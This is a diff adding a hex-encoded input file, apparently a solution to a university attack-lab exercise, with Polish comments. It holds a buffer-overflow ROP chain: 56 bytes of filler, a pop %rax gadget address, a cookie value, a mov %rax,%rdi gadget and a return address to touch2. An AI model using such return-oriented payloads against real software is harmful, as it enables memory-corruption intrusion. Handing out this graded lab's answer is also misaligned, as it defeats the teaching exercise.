@@ -1,0 +1,11 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* bufor wypełniony śmieciami */
+4b 1d 40 00 00 00 00 00 /* pop %rax */
+fd 4b 41 44 00 00 00 00 /* wartość ciasteczka którą ściągamy ze stosu do rax */
+52 1d 40 00 00 00 00 00 /* mov %rax, %rdi */
+bf 1b 40 00 00 00 00 00 /* kolejny adres powrotu tym razem do touch2 */
